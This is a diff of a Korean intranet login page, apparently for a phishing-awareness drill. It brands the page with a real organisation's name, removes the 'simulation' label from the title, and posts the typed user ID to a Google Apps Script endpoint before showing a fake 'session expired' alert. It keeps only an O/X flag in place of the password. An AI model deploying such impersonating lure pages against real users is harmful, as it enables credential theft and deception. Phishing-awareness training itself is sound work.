@@ -2,46 +2,104 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>사내 시스템 로그인 (시뮬레이션)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>사내 인트라넷 로그인</title>
+    <style>
+        body { 
+            font-family: 'Malgun Gothic', sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; background-color: #ffffff; margin: 0; 
+        }
+        .login-container {
+            width: 380px;
+            padding: 40px;
+            border: 1px solid #e0e0e0;
+            background-color: #ffffff;
+            text-align: center;
+        }
+        .logo-area {
+            margin-bottom: 30px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+        /* 입력창 디자인 (형이 보여준 이미지 참고) */
+        input[type="text"], input[type="password"] { 
+            width: 100%; 
+            padding: 14px; 
+            margin-bottom: 10px; 
+            border: 1px solid #333; 
+            background-color: #e8f0fe; /* 살짝 푸른빛 도는 회색 배경 */
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        /* 로그인 버튼 디자인 */
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #009ebf; /* 시원한 청록색 계열 */
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            font-size: 15px; 
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        button:hover { background-color: #00819c; }
+        .options {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            font-size: 12px;
+            color: #666;
+        }
+        .options input { margin-right: 5px; }
+    </style>
 </head>
 <body>
 
-    <h2>사내 인트라넷 로그인</h2>
-    <form id="phishingForm">
-        <input type="text" id="userId" placeholder="사번 또는 아이디" required><br><br>
-        <input type="password" id="userPw" placeholder="비밀번호" required><br><br>
-        <button type="submit">로그인</button>
-    </form>
+    <div class="login-container">
+        
+        <div class="logo-area">
+            [ 굿네이버스 ]
+        </div>
+        
+        <form id="phishingForm">
+            <input type="text" id="userId" placeholder="아이디를 입력하세요" required>
+            <input type="password" id="userPw" placeholder="비밀번호" required>
+            <button type="submit">로그인</button>
+            
+            <div class="options">
+                <input type="checkbox" id="saveId"> <label for="saveId">계정 저장</label>
+            </div>
+        </form>
+    </div>
 
     <script>
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // 페이지 새로고침 방지
+            e.preventDefault(); 
 
-            // 사용자가 입력한 값 가져오기
             var userId = document.getElementById('userId').value;
             var userPw = document.getElementById('userPw').value;
-            
-            // 비밀번호는 길이에 따라 O, X로만 판별 (실제 값은 버림)
             var isPwEntered = userPw.length > 0 ? 'O' : 'X';
             
-            // ★ 여기에 아까 2단계에서 복사한 '웹 앱 URL'을 넣어줘! ★
-            var gasUrl = 'https://script.google.com/macros/s/AKfycbxx3xoV30Fq8UB4bCDtSLXRwsWkFOEjt-fm2cw9w7mqufJCTN6THnQCUnBRhhwgAHAgKA/exec';
+            // ★ 전에 발급받은 구글 앱스 스크립트 웹 앱 URL을 여기에 넣어줘 ★
+            var gasUrl = '여기에_웹_앱_URL을_붙여넣으세요';
 
-            // 폼 데이터 형태로 포장
             var formData = new FormData();
             formData.append('userId', userId);
             formData.append('isPwEntered', isPwEntered);
 
-            // 구글 시트로 데이터 전송
             fetch(gasUrl, {
                 method: 'POST',
+                mode: 'no-cors', 
                 body: formData
-            }).then(response => {
-                // 전송이 끝나면 깜빡 속도록 가짜 에러 메시지 띄우기
-                alert('세션이 만료되었습니다. 다시 시도해주세요.');
+            }).then(() => {
+                alert('세션이 만료되었습니다. 다시 로그인해주세요.');
                 window.location.reload(); 
             }).catch(error => {
-                console.error('Error:', error);
+                alert('세션이 만료되었습니다. 다시 로그인해주세요.');
+                window.location.reload(); 
             });
         });
     </script>
